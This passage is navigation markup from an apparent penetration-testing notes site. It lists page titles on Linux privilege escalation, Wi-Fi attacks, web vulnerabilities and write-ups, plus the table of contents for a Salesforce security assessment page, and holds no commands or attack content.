      Conclusion
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Salesforce%20-%202/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Salesforce   2
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Salesforce%20-%203/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Salesforce   3
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Salesforce%20-%204/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Salesforce   4
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_8" >
        
          
          <label class="md-nav__link" for="__nav_5_2_8" id="__nav_5_2_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Linux Privilege Escalation
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_2_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_8">
            <span class="md-nav__icon md-icon"></span>
            Linux Privilege Escalation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux%20Privilege%20Escalation/ACLs/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ACLs
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux%20Privilege%20Escalation/Capabilities/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Capabilities
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux%20Privilege%20Escalation/Credential%20Hunting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Credential Hunting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux%20Privilege%20Escalation/Environment%20Hunting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Environment Hunting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux%20Privilege%20Escalation/General%20Information/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    General Information
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux%20Privilege%20Escalation/Groups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Groups
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux%20Privilege%20Escalation/Low-Level%20Exploits/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Low Level Exploits
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux%20Privilege%20Escalation/NFS%2C%20Samba%2C%20Network%20Shares/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NFS, Samba, Network Shares
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux%20Privilege%20Escalation/Permissions/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Permissions
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux%20Privilege%20Escalation/Restricted%20Shells/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Restricted Shells
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux%20Privilege%20Escalation/Service-Based%20Escalation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Service Based Escalation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux%20Privilege%20Escalation/Shared%20Libraries%20%26%20Interpreter%20Hijacking/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Shared Libraries & Interpreter Hijacking
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux%20Privilege%20Escalation/Writable%20Directories/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Writable Directories
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_9" >
        
          
          <label class="md-nav__link" for="__nav_5_2_9" id="__nav_5_2_9_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Wifi
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_2_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_9">
            <span class="md-nav__icon md-icon"></span>
            Wifi
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../wifi/Attacking/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Attacking
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../wifi/Bypassing%20MAC%20Filtering/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Bypassing MAC Filtering
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../wifi/Cracking%20Passphrases/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cracking Passphrases
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../wifi/Decrypting%20Captures/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Decrypting Captures
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../wifi/Driver%20Installation%20Alfa%20A1US036ACS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Driver Installation Alfa A1US036ACS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../wifi/Finding%20Hidden%20Networks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Finding Hidden Networks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../wifi/Interface%20Modes/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Interface Modes
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../wifi/Monitor%20Mode/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Monitor Mode
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../wifi/Reconnaissance/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Reconnaissance
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Web Application
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Web Application
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Under Construction
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Insecure%20File%20Uploads/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Insecure File Uploads
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Verb%20Tampering/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Verb Tampering
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Web%20Application%20Firewall/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Web Application Firewall
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_5" >
        
          
          <label class="md-nav__link" for="__nav_6_5" id="__nav_6_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    API
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_5">
            <span class="md-nav__icon md-icon"></span>
            API
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/API/-%20Getting%20Started/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
      Getting Started
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/API/API/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    API
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/API/Mass%20Assignment/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Mass Assignment
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_6" >
        
          
          <label class="md-nav__link" for="__nav_6_6" id="__nav_6_6_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Access Control
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_6">
            <span class="md-nav__icon md-icon"></span>
            Access Control
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Access%20Control/-%20Getting%20Started/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
      Getting Started
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Access%20Control/Broken%20Function%20Level%20Access%20%28BLFA%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Broken Function Level Access (BLFA)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Access%20Control/Broken%20Object%20Level%20Access%20%28BOLA%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Broken Object Level Access (BOLA)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Access%20Control/Insecure%20Direct%20Object%20Reference%20%28IDOR%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Insecure Direct Object Reference (IDOR)
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_7" >
        
          
          <label class="md-nav__link" for="__nav_6_7" id="__nav_6_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Authentication
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_7">
            <span class="md-nav__icon md-icon"></span>
            Authentication
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Authentication/-%20Getting%20Started/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
      Getting Started
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Authentication/Brute%20Forcing%20Authentication/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Brute Forcing Authentication
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Authentication/Json%20Web%20Tokens%20%28JWTs%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Json Web Tokens (JWTs)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Authentication/Multi-Factor%20Authentication/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Multi Factor Authentication
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Authentication/Rate%20Limiting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Rate Limiting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Authentication/Session%20Tokens/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Session Tokens
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_8" >
        
          
          <label class="md-nav__link" for="__nav_6_8" id="__nav_6_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Discovery
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_8">
            <span class="md-nav__icon md-icon"></span>
            Discovery
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Discovery/Directory%20Fuzzing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Directory Fuzzing
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Discovery/Google%20Dorks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Google Dorks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Discovery/Parameter%20Fuzzing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Parameter Fuzzing
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_9" >
        
          
          <label class="md-nav__link" for="__nav_6_9" id="__nav_6_9_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    File Inclusion
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_9">
            <span class="md-nav__icon md-icon"></span>
            File Inclusion
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/File%20Inclusion/Directory%20Traversal/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Directory Traversal
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/File%20Inclusion/Filter%20Bypasses/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Filter Bypasses
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/File%20Inclusion/Local%20File%20Inclusion%20%28LFI%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Local File Inclusion (LFI)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/File%20Inclusion/Remote%20File%20Inclusion/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Remote File Inclusion
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_10" >
        
          
          <label class="md-nav__link" for="__nav_6_10" id="__nav_6_10_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Injections
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_10">
            <span class="md-nav__icon md-icon"></span>
            Injections
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Injections/Command%20Injection/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Command Injection
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cross Site Scripting (XSS)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Injections/External%20Entity%20Injection%20%28XXE%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    External Entity Injection (XXE)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Injections/NoSQL%20Injection/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NoSQL Injection
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Injections/SQL%20Injection/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    SQL Injection
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Injections/Server-Side%20Template%20Injection%20%28SSTI%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Server Side Template Injection (SSTI)
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_11" >
        
          
          <label class="md-nav__link" for="__nav_6_11" id="__nav_6_11_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Request Forgery
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_11_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_11">
            <span class="md-nav__icon md-icon"></span>
            Request Forgery
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Request%20Forgery/Cross-Site%20Request%20Forgery%20%28CSRF%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cross Site Request Forgery (CSRF)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Web%20Application/Request%20Forgery/Server%20Side%20Request%20Forgery/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Server Side Request Forgery
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            Writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Index
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2" >
        
          
          <label class="md-nav__link" for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    HackTheBox
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_2">
            <span class="md-nav__icon md-icon"></span>
            HackTheBox
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../writeups/HackTheBox/OverCertified/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    OverCertified
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#table-of-contents" class="md-nav__link">
    <span class="md-ellipsis">
      Table of Contents
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pre-engagement-setup" class="md-nav__link">
    <span class="md-ellipsis">
      Pre-Engagement Setup
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Pre-Engagement Setup">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#essential-tools" class="md-nav__link">
    <span class="md-ellipsis">
      Essential Tools
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#initial-access-validation" class="md-nav__link">
    <span class="md-ellipsis">
      Initial Access Validation
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance-intelligence-gathering" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance &amp; Intelligence Gathering
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance &amp; Intelligence Gathering">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-salesforce-instance-discovery" class="md-nav__link">
    <span class="md-ellipsis">
      1. Salesforce Instance Discovery
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-organization-metadata-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      2. Organization Metadata Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-user-role-intelligence" class="md-nav__link">
    <span class="md-ellipsis">
      3. User &amp; Role Intelligence
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-custom-code-object-discovery" class="md-nav__link">
    <span class="md-ellipsis">
      4. Custom Code &amp; Object Discovery
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#authentication-security-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      Authentication Security Assessment
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Authentication Security Assessment">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-password-policy-evaluation" class="md-nav__link">
    <span class="md-ellipsis">
      1. Password Policy Evaluation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-multi-factor-authentication-mfa-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      2. Multi-Factor Authentication (MFA) Assessment
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-session-security-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      3. Session Security Analysis
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-single-sign-on-sso-security" class="md-nav__link">
    <span class="md-ellipsis">
      4. Single Sign-On (SSO) Security
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#authorization-access-control-testing" class="md-nav__link">
    <span class="md-ellipsis">
      Authorization &amp; Access Control Testing
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Authorization &amp; Access Control Testing">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-profile-permission-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      1. Profile &amp; Permission Analysis
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-field-level-security-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      2. Field-Level Security Assessment
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-record-level-security-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      3. Record-Level Security Analysis
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-guest-user-security-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      4. Guest User Security Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#data-security-evaluation" class="md-nav__link">
    <span class="md-ellipsis">
      Data Security Evaluation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Data Security Evaluation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-sensitive-data-discovery-classification" class="md-nav__link">
    <span class="md-ellipsis">
      1. Sensitive Data Discovery &amp; Classification
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-data-export-exfiltration-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      2. Data Export &amp; Exfiltration Assessment
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-encryption-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      3. Encryption Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#custom-code-security-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Custom Code Security Analysis
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Custom Code Security Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-soqlsosl-injection-vulnerabilities" class="md-nav__link">
    <span class="md-ellipsis">
      1. SOQL/SOSL Injection Vulnerabilities
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-authorization-bypass-in-apex" class="md-nav__link">
    <span class="md-ellipsis">
      2. Authorization Bypass in Apex
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-visualforce-security-vulnerabilities" class="md-nav__link">
    <span class="md-ellipsis">
      3. Visualforce Security Vulnerabilities
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-lightning-component-security" class="md-nav__link">
    <span class="md-ellipsis">
      4. Lightning Component Security
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#platform-configuration-security" class="md-nav__link">
    <span class="md-ellipsis">
      Platform Configuration Security
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Platform Configuration Security">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-critical-security-settings-audit" class="md-nav__link">
    <span class="md-ellipsis">
      1. Critical Security Settings Audit
    </span>
  </a>
  
</li>
        
